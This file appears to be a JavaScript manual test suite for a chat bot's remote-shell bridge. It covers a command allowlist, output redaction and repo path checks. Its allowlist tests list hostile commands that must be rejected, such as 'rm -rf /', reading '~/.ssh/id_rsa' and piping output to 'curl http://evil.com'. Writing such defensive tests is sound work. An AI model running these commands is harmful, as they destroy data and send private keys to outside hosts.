#!/usr/bin/env node
/**
 * MT-83: Remote Shell + Copilot CLI — Manual Tests
 *
 * Tests Sprint 83 features via compiled dist/ modules.
 * 42 tests across 7 phases:
 *   1. Repo Context (/repos, /focus, /where)
 *   2. Copilot CLI Bridge (detect, suggest, explain, status)
 *   3. Shell Allowlist (allowed, blocked, metachar, pipes)
 *   4. Shell Session Manager (marker protocol, queue, capture)
 *   5. /sh, /attach, /run Command Handlers
 *   6. Security (MF-1 metachar, MF-2 redaction, MF-3 atomic writes)
 *   7. Approval + executeApprovedRun
 *
 * @sprint 83
 * @authority ADR-024 D4/D5, Sprint 83
 * @requires build: pnpm build
 */

import { existsSync, mkdirSync, writeFileSync, readFileSync, rmSync } from "node:fs";
import { join, dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { tmpdir } from "node:os";

const __dirname = dirname(fileURLToPath(import.meta.url));
const ROOT = resolve(__dirname, "../..");

// ============================================================================
// Test runner
// ============================================================================

let passed = 0;
let failed = 0;
const results = [];

function test(id, description, fn) {
  try {
    fn();
    console.log(`  ✅ ${id}: ${description}`);
    passed++;
    results.push({ id, description, status: "PASS" });
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.log(`  ❌ ${id}: ${description}`);
    console.log(`       ${msg}`);
    failed++;
    results.push({ id, description, status: "FAIL", error: msg });
  }
}

async function testAsync(id, description, fn) {
  try {
    await fn();
    console.log(`  ✅ ${id}: ${description}`);
    passed++;
    results.push({ id, description, status: "PASS" });
  } catch (err) {
    const msg = err instanceof Error ? err.message : String(err);
    console.log(`  ❌ ${id}: ${description}`);
    console.log(`       ${msg}`);
    failed++;
    results.push({ id, description, status: "FAIL", error: msg });
  }
}

function assert(condition, message) {
  if (!condition) throw new Error(message ?? "Assertion failed");
}

// ============================================================================
// Dynamic imports (ESM from dist/)
// ============================================================================

const allowlistPath = join(ROOT, "dist/bridge/shell/shell-allowlist.js");
const copilotPath = join(ROOT, "dist/bridge/copilot/copilot-bridge.js");
const repoRegistryPath = join(ROOT, "dist/bridge/repo/repo-registry.js");
const chatFocusPath = join(ROOT, "dist/bridge/repo/chat-focus.js");
const shellManagerPath = join(ROOT, "dist/bridge/shell/shell-session-manager.js");
const outputRedactorPath = join(ROOT, "dist/bridge/security/output-redactor.js");

assert(existsSync(allowlistPath), `Missing dist: ${allowlistPath}. Run pnpm build first.`);

const { isAllowed } = await import(allowlistPath);
const { CopilotBridge, stripAnsi } = await import(copilotPath);
const { RepoRegistry, validateRepoPath } = await import(repoRegistryPath);
const { ChatFocusManager } = await import(chatFocusPath);
const { ShellSessionManager } = await import(shellManagerPath);
const { redactBridgeOutput } = await import(outputRedactorPath);

// ============================================================================
// Temp directories for file-backed tests
// ============================================================================

const tmpBase = join(tmpdir(), `mt83-${Date.now()}`);
mkdirSync(tmpBase, { recursive: true });

// Create a fake git repo for path validation tests
const fakeGitRepo = join(tmpBase, "fakerepo");
mkdirSync(join(fakeGitRepo, ".git"), { recursive: true });

// ============================================================================
// Phase 1: Repo Context (7 tests)
// ============================================================================

console.log("\n📂 Phase 1: Repo Context (/repos, /focus, /where)");

test("MT-83-01", "RepoRegistry.add() validates absolute path", () => {
  const registry = new RepoRegistry(join(tmpBase, "repos-01.json"));
  const result = registry.add("bad", "relative/path");
  assert(!result.success, "Expected failure");
  assert(result.error.includes("absolute"), `Expected 'absolute' in error, got: ${result.error}`);
});

test("MT-83-02", "RepoRegistry.add() validates .git presence", () => {
  const noGit = join(tmpBase, "nogit");
  mkdirSync(noGit, { recursive: true });
  const registry = new RepoRegistry(join(tmpBase, "repos-02.json"));
  const result = registry.add("nogit", noGit);
  assert(!result.success, "Expected failure");
  assert(result.error.includes(".git"), `Expected '.git' in error, got: ${result.error}`);
});

test("MT-83-03", "RepoRegistry.add() succeeds with valid repo", () => {
  const registry = new RepoRegistry(join(tmpBase, "repos-03.json"));
  const result = registry.add("fakerepo", fakeGitRepo);
  assert(result.success, `Expected success, got error: ${result.error}`);
  const repo = registry.get("fakerepo");
  assert(repo !== null, "Should find added repo");
  assert(repo.name === "fakerepo", "Name should match");
});

test("MT-83-04", "RepoRegistry.list() returns all registered repos", () => {
  const registry = new RepoRegistry(join(tmpBase, "repos-04.json"));
  registry.add("repo1", fakeGitRepo);
  const list = registry.list();
  assert(list.length === 1, `Expected 1, got ${list.length}`);
  assert(list[0].name === "repo1", "Should find repo1");
});

test("MT-83-05", "RepoRegistry.remove() removes registered repo", () => {
  const registry = new RepoRegistry(join(tmpBase, "repos-05.json"));
  registry.add("toremove", fakeGitRepo);
  const removed = registry.remove("toremove");
  assert(removed, "Expected removal to succeed");
  assert(registry.get("toremove") === null, "Should be gone");
});

test("MT-83-06", "ChatFocusManager set/get/clear works", () => {
  const fm = new ChatFocusManager(join(tmpBase, "focus-06.json"));
  fm.setFocus("chat1", "repoA");
  const focus = fm.getFocus("chat1");
  assert(focus !== null, "Focus should exist");
  assert(focus.repoName === "repoA", `Expected repoA, got ${focus.repoName}`);
  fm.clearFocus("chat1");
  assert(fm.getFocus("chat1") === null, "Focus should be cleared");
});

test("MT-83-07", "validateRepoPath blocks path traversal (..)", () => {
  const result = validateRepoPath("/home/deploy/../etc/passwd");
  assert(!result.valid, "Expected invalid");
  assert(result.error.includes("traversal"), `Expected 'traversal' in error, got: ${result.error}`);
});

// ============================================================================
// Phase 2: Copilot CLI Bridge (6 tests)
// ============================================================================

console.log("\n🔧 Phase 2: Copilot CLI Bridge");

await testAsync("MT-83-08", "CopilotBridge.detect() returns 'none' when no CLI", async () => {
  const mockExec = {
    async exec() { return { stdout: "", stderr: "", exitCode: 1 }; },
  };
  const bridge = new CopilotBridge(mockExec);
  const result = await bridge.detect();
  assert(result.kind === "none", `Expected none, got ${result.kind}`);
});

await testAsync("MT-83-09", "CopilotBridge.detect() returns 'copilot-cli' when found", async () => {
  const mockExec = {
    async exec(bin, args) {
      if (bin === "command") return { stdout: "/usr/local/bin/copilot", stderr: "", exitCode: 0 };
      if (bin === "copilot" && args[0] === "--version") return { stdout: "1.0.2", stderr: "", exitCode: 0 };
      if (bin === "copilot" && args[0] === "suggest") return { stdout: "help text", stderr: "", exitCode: 0 };
      return { stdout: "", stderr: "", exitCode: 1 };
    },
  };
  const bridge = new CopilotBridge(mockExec);
  const result = await bridge.detect();
  assert(result.kind === "copilot-cli", `Expected copilot-cli, got ${result.kind}`);
  assert(result.version === "1.0.2", `Expected 1.0.2, got ${result.version}`);
});

await testAsync("MT-83-10", "CopilotBridge.suggest() returns no-CLI message when none", async () => {
  const mockExec = {
    async exec() { return { stdout: "", stderr: "", exitCode: 1 }; },
  };
  const bridge = new CopilotBridge(mockExec);
  const result = await bridge.suggest("list files", "/tmp");
  assert(!result.success, "Expected failure");
  assert(result.output.includes("not found"), `Expected 'not found', got: ${result.output}`);
});

await testAsync("MT-83-11", "CopilotBridge.explain() works with copilot-cli", async () => {
  const mockExec = {
    async exec(bin, args) {
      if (bin === "command") return { stdout: "/usr/local/bin/copilot", stderr: "", exitCode: 0 };
      if (bin === "copilot" && args[0] === "--version") return { stdout: "1.0.2", stderr: "", exitCode: 0 };
      if (bin === "copilot" && args[0] === "suggest") return { stdout: "help", stderr: "", exitCode: 0 };
      if (bin === "copilot" && args[0] === "explain") return { stdout: "This command finds files", stderr: "", exitCode: 0 };
      return { stdout: "", stderr: "", exitCode: 1 };
    },
  };
  const bridge = new CopilotBridge(mockExec);
  const result = await bridge.explain("find .", "/tmp");
  assert(result.success, "Expected success");
  assert(result.output.includes("finds files"), `Expected 'finds files', got: ${result.output}`);
});

test("MT-83-12", "stripAnsi removes ANSI escape codes", () => {
  const input = "\x1B[31mred text\x1B[0m normal";
  const cleaned = stripAnsi(input);
  assert(!cleaned.includes("\x1B"), "Should not contain escape codes");
  assert(cleaned.includes("red text"), "Should preserve text");
  assert(cleaned.includes("normal"), "Should preserve rest");
});

await testAsync("MT-83-13", "CopilotBridge.getStatus() shows detection result", async () => {
  const mockExec = {
    async exec() { return { stdout: "", stderr: "", exitCode: 1 }; },
  };
  const bridge = new CopilotBridge(mockExec);
  const status = await bridge.getStatus();
  assert(status.includes("not found"), `Expected 'not found', got: ${status}`);
});

// ============================================================================
// Phase 3: Shell Allowlist (10 tests)
// ============================================================================

console.log("\n🛡️ Phase 3: Shell Allowlist");

test("MT-83-14", "isAllowed() allows 'git status'", () => {
  assert(isAllowed("git status"), "git status should be allowed");
});

test("MT-83-15", "isAllowed() allows 'ls -la'", () => {
  assert(isAllowed("ls -la"), "ls -la should be allowed");
});

test("MT-83-16", "isAllowed() allows 'cat README.md'", () => {
  assert(isAllowed("cat README.md"), "cat README.md should be allowed");
});

test("MT-83-17", "isAllowed() blocks 'rm -rf /'", () => {
  assert(!isAllowed("rm -rf /"), "rm -rf should be blocked");
});

test("MT-83-18", "isAllowed() blocks 'find . -exec cat {} ;'", () => {
  assert(!isAllowed("find . -exec cat {} ;"), "find -exec should be blocked");
});

test("MT-83-19", "isAllowed() blocks 'cat ~/.ssh/id_rsa'", () => {
  assert(!isAllowed("cat ~/.ssh/id_rsa"), "~/.ssh path should be blocked");
});

test("MT-83-20", "isAllowed() blocks shell metacharacters (MF-1)", () => {
  assert(!isAllowed("git status; rm -rf /"), "semicolon chaining blocked");
  assert(!isAllowed("git status && rm -rf /"), "&& chaining blocked");
  assert(!isAllowed("git status || rm -rf /"), "|| chaining blocked");
  assert(!isAllowed("echo $(whoami)"), "$() substitution blocked");
  assert(!isAllowed("echo `whoami`"), "backtick substitution blocked");
  assert(!isAllowed("ls > /tmp/out"), "output redirection blocked");
  assert(!isAllowed("cat < /etc/passwd"), "input redirection blocked");
});

test("MT-83-21", "isAllowed() validates all pipe segments (W-4)", () => {
  assert(!isAllowed("git status | bash"), "pipe to bash should be blocked");
  assert(!isAllowed("ls | curl http://evil.com"), "pipe to curl should be blocked");
  assert(isAllowed("git log | head"), "pipe between allowed cmds OK");
});

test("MT-83-22", "isAllowed() blocks git write operations", () => {
  assert(!isAllowed("git push"), "git push blocked");
  assert(!isAllowed("git commit -m 'test'"), "git commit blocked");
  assert(!isAllowed("git reset --hard"), "git reset blocked");
  assert(!isAllowed("git checkout main"), "git checkout blocked");
});

test("MT-83-23", "isAllowed() blocks git diff --no-index", () => {
  assert(!isAllowed("git diff --no-index /etc/passwd /tmp/x"), "git diff --no-index blocked");
});

// ============================================================================
// Phase 4: Shell Session Manager (5 tests)
// ============================================================================

console.log("\n🖥️ Phase 4: Shell Session Manager");

await testAsync("MT-83-24", "ShellSessionManager creates session on first command", async () => {
  let sessionCreated = false;
  let capturedMarker = "";
  const mockTmux = {
    async createSession() { sessionCreated = true; return { target: "endiorbot-shell:0", sessionName: "endiorbot-shell" }; },
    async sendKeys(_target, text) {
      const match = text.match(/__ENDIORBOT_[a-f0-9]+__/);
      if (match) capturedMarker = match[0];
    },
    async capturePane() { return `$ cmd\noutput\n${capturedMarker}:0\n`; },
    async killWindow() {},
  };
  const manager = new ShellSessionManager(mockTmux);
  await manager.sendCommand("testrepo", "/tmp", "git status");
  assert(sessionCreated, "Session should have been created");
  assert(manager.hasSession("testrepo"), "Session should exist");
});

await testAsync("MT-83-25", "ShellSessionManager parses exit code from marker", async () => {
  let capturedMarker = "";
  const mockTmux = {
    async createSession() { return { target: "endiorbot-shell:0", sessionName: "endiorbot-shell" }; },
    async sendKeys(_target, text) {
      // Extract marker from the command: `cmd; echo "__ENDIORBOT_XXXX__:$?"`
      const match = text.match(/__ENDIORBOT_[a-f0-9]+__/);
      if (match) capturedMarker = match[0];
    },
    async capturePane() {
      return `$ git status\nclean tree\n${capturedMarker}:0\n`;
    },
    async killWindow() {},
  };
  const manager = new ShellSessionManager(mockTmux);
  const result = await manager.sendCommand("testrepo", "/tmp", "git status");
  assert(result.exitCode === 0, `Expected exit 0, got ${result.exitCode}`);
  assert(!result.timedOut, "Should not time out");
});

await testAsync("MT-83-26", "ShellSessionManager rejects queue overflow (>3)", async () => {
  let callCount = 0;
  const mockTmux = {
    async createSession() { return { target: "endiorbot-shell:0", sessionName: "endiorbot-shell" }; },
    async sendKeys() {},
    async capturePane() {
      callCount++;
      // Never return marker so it stays "in flight" long enough
      if (callCount < 100) return "$ working...\n";
      return "__ENDIORBOT_12345678__:0\n";
    },
    async killWindow() {},
  };
  const manager = new ShellSessionManager(mockTmux);

  // Start a long-running command (will poll capturePane many times)
  const cmd1 = manager.sendCommand("repo", "/tmp", "cmd1");
  // Wait a tick so cmd1 enters executeCommand and sets inFlight
  await new Promise(r => setTimeout(r, 50));

  // Queue 3 more (max depth)
  const cmd2 = manager.sendCommand("repo", "/tmp", "cmd2");
  const cmd3 = manager.sendCommand("repo", "/tmp", "cmd3");
  const cmd4 = manager.sendCommand("repo", "/tmp", "cmd4");

  // 5th should be rejected immediately
  const cmd5Result = await manager.sendCommand("repo", "/tmp", "cmd5");
  assert(cmd5Result.output.includes("Too many"), `Expected overflow rejection, got: ${cmd5Result.output}`);
  assert(cmd5Result.exitCode === -1, "Exit code should be -1 for overflow");

  // Kill session to stop polling
  await manager.killSession("repo");
});

await testAsync("MT-83-27", "ShellSessionManager.captureOutput returns no-session msg", async () => {
  const mockTmux = {
    async createSession() { return { target: "t:0", sessionName: "t" }; },
    async sendKeys() {},
    async capturePane() { return "output"; },
    async killWindow() {},
  };
  const manager = new ShellSessionManager(mockTmux);
  const result = await manager.captureOutput("nonexistent");
  assert(result.output.includes("No shell session"), `Expected no-session msg, got: ${result.output}`);
});

await testAsync("MT-83-28", "ShellSessionManager.killSession cleans up", async () => {
  let killed = false;
  let capturedMarker = "";
  const mockTmux = {
    async createSession() { return { target: "endiorbot-shell:0", sessionName: "endiorbot-shell" }; },
    async sendKeys(_target, text) {
      const match = text.match(/__ENDIORBOT_[a-f0-9]+__/);
      if (match) capturedMarker = match[0];
    },
    async capturePane() { return `${capturedMarker}:0\n`; },
    async killWindow() { killed = true; },
  };
  const manager = new ShellSessionManager(mockTmux);
  await manager.sendCommand("repo", "/tmp", "echo hi");
  assert(manager.hasSession("repo"), "Session should exist");
  const result = await manager.killSession("repo");
  assert(result, "Kill should return true");
  assert(!manager.hasSession("repo"), "Session should be gone");
  assert(killed, "killWindow should have been called");
});

// ============================================================================
// Phase 5: Output Redaction (4 tests)
// ============================================================================

console.log("\n🔒 Phase 5: Output Redaction + Security");

test("MT-83-29", "redactBridgeOutput blocks PRIVATE KEY", () => {
  const result = redactBridgeOutput("-----BEGIN RSA PRIVATE KEY-----\nMIIE...", "read");
  assert(result.blocked, "Should be blocked");
});

test("MT-83-30", "redactBridgeOutput passes clean git output", () => {
  const result = redactBridgeOutput("On branch main\nnothing to commit", "read");
  assert(!result.blocked, "Should not be blocked");
  assert(result.content.includes("main"), "Content should pass through");
});

test("MT-83-31", "redactBridgeOutput redacts API tokens", () => {
  const result = redactBridgeOutput("TOKEN=sk-ant-api03-abc123", "read");
  assert(!result.blocked, "Should not be fully blocked");
  assert(result.content.includes("[REDACTED]"), "Should have [REDACTED]");
});

test("MT-83-32", "redactBridgeOutput enforces line limits by riskMode", () => {
  const longOutput = Array.from({ length: 100 }, (_, i) => `Line ${i + 1}`).join("\n");
  const readResult = redactBridgeOutput(longOutput, "read");
  const readLines = readResult.content.trim().split("\n").length;
  assert(readLines <= 30, `Read mode should cap at 30 lines, got ${readLines}`);

  const interactiveResult = redactBridgeOutput(longOutput, "interactive");
  const interactiveLines = interactiveResult.content.trim().split("\n").length;
  assert(interactiveLines <= 100, `Interactive mode should cap at 100, got ${interactiveLines}`);
  assert(interactiveLines > readLines, "Interactive should allow more lines than read");
});

// ============================================================================
// Phase 6: Atomic Writes (MF-3) (4 tests)
// ============================================================================

console.log("\n💾 Phase 6: Atomic Writes (MF-3)");

test("MT-83-33", "RepoRegistry write is atomic (file contains valid JSON after add)", () => {
  const regPath = join(tmpBase, "repos-33.json");
  const registry = new RepoRegistry(regPath);
  registry.add("atomictest", fakeGitRepo);
  const raw = readFileSync(regPath, "utf-8");
  const parsed = JSON.parse(raw);
  assert(parsed.version >= 1, `Version should be >= 1, got ${parsed.version}`);
  assert(typeof parsed.checksum === "string" && parsed.checksum.length > 0, "Should have checksum");
  assert(parsed.repos.length === 1, "Should have 1 repo");
});

test("MT-83-34", "ChatFocusManager write is atomic (file contains valid JSON)", () => {
  const focusPath = join(tmpBase, "focus-34.json");
  const fm = new ChatFocusManager(focusPath);
  fm.setFocus("chat_atomic", "repo_atomic");
  const raw = readFileSync(focusPath, "utf-8");
  const parsed = JSON.parse(raw);
  assert(parsed.version >= 1, `Version should be >= 1, got ${parsed.version}`);
  assert(typeof parsed.checksum === "string" && parsed.checksum.length > 0, "Should have checksum");
  assert(parsed.entries.length === 1, "Should have 1 entry");
});

test("MT-83-35", "RepoRegistry rejects duplicate repo names", () => {
  const registry = new RepoRegistry(join(tmpBase, "repos-35.json"));
  registry.add("dup", fakeGitRepo);
  const result = registry.add("dup", fakeGitRepo);
  assert(!result.success, "Expected duplicate rejection");
  assert(result.error.includes("already exists"), `Expected 'already exists', got: ${result.error}`);
});

test("MT-83-36", "ChatFocusManager.setFocus overwrites previous focus", () => {
  const fm = new ChatFocusManager(join(tmpBase, "focus-36.json"));
  fm.setFocus("chat_x", "repo_a");
  fm.setFocus("chat_x", "repo_b");
  const focus = fm.getFocus("chat_x");
  assert(focus.repoName === "repo_b", `Expected repo_b, got ${focus.repoName}`);
});

// ============================================================================
// Phase 7: Integration Sanity (6 tests)
// ============================================================================

console.log("\n🔗 Phase 7: Integration Sanity");

test("MT-83-37", "Allowlist + redaction: allowed cmd output passes through", () => {
  assert(isAllowed("git status"), "git status should be allowed");
  const redacted = redactBridgeOutput("On branch main\nYour branch is up to date", "read");
  assert(!redacted.blocked, "Clean output should pass");
});

test("MT-83-38", "Allowlist + redaction: blocked cmd never reaches redaction", () => {
  assert(!isAllowed("rm -rf /"), "rm should be blocked at allowlist");
  // If allowlist blocks, redaction is never reached — this is correct flow
});

test("MT-83-39", "Env inspection allowed: 'env | grep ENDIORBOT' pattern", () => {
  // env pipe to grep should be allowed for filtered env inspection
  // But our metacharacter guard blocks pipes with non-allowed... let me check
  const allowed = isAllowed("env | grep ENDIORBOT");
  // env is allowed, grep is allowed, pipe between them should work
  assert(allowed, "env | grep should be allowed");
});

test("MT-83-40", "Version checks allowed", () => {
  assert(isAllowed("node -v"), "node -v should be allowed");
  assert(isAllowed("pnpm -v"), "pnpm -v should be allowed");
  assert(isAllowed("npm --version"), "npm --version should be allowed");
  assert(isAllowed("tsc --version"), "tsc --version should be allowed");
});

test("MT-83-41", "Safe read commands allowed", () => {
  assert(isAllowed("head -20 package.json"), "head should be allowed");
  assert(isAllowed("tail -f logs.txt"), "tail should be allowed");
  assert(isAllowed("wc -l src/index.ts"), "wc should be allowed");
  assert(isAllowed("file dist/index.js"), "file should be allowed");
});

test("MT-83-42", "Git read-only subcommands allowed", () => {
  assert(isAllowed("git diff"), "git diff should be allowed");
  assert(isAllowed("git log --oneline"), "git log should be allowed");
  assert(isAllowed("git branch -a"), "git branch should be allowed");
  assert(isAllowed("git show HEAD"), "git show should be allowed");
  assert(isAllowed("git remote -v"), "git remote should be allowed");
});

// ============================================================================
// Cleanup
// ============================================================================

try {
  rmSync(tmpBase, { recursive: true, force: true });
} catch {
  // Ignore cleanup errors
}

// ============================================================================
// Summary
// ============================================================================

console.log("\n" + "=".repeat(60));
console.log(`MT-83 Results: ${passed} PASS | ${failed} FAIL | ${passed + failed} TOTAL`);
console.log("=".repeat(60));

if (failed > 0) {
  console.log("\nFailed tests:");
  for (const r of results.filter((r) => r.status === "FAIL")) {
    console.log(`  ❌ ${r.id}: ${r.description} — ${r.error}`);
  }
}

process.exit(failed > 0 ? 1 : 0);
